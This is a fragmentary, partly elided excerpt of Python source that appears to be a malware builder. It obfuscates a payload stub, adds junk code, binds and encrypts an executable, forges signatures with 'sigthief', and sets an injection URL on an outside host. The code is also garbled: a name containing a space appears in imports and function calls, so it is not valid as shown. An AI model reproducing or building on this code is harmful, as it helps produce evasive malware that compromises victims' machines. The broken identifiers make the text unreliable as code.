...
disable_warnings()
import tokkyos jzOBF as obfuscator
from sigthief import outputCert

SettingsFile = "config.json"
InCodeFile = "stub.py"
OutCodeFile = "stub-o.py"
InjectionURL = "https://guns.lol/tokkyos jz"
...
def PrepareEnvironment(settings: dict) -> None:
    if os.path.isfile("bound.exe"):
        ...
        with open("bound.tokkyos jz", "wb") as file:
            file.write(encrypted)
        
    elif os.path.isfile("bound.tokkyos jz"):
        os.remove("bound.tokkyos jz")
...
def main() -> None:
    ...
    obfuscator.tokkyos jzOBF(code, OutCodeFile)
    junk(OutCodeFile)

    compiledFile = "stub-o.pyc"
    zipFile = "tokkyos jz.aes"
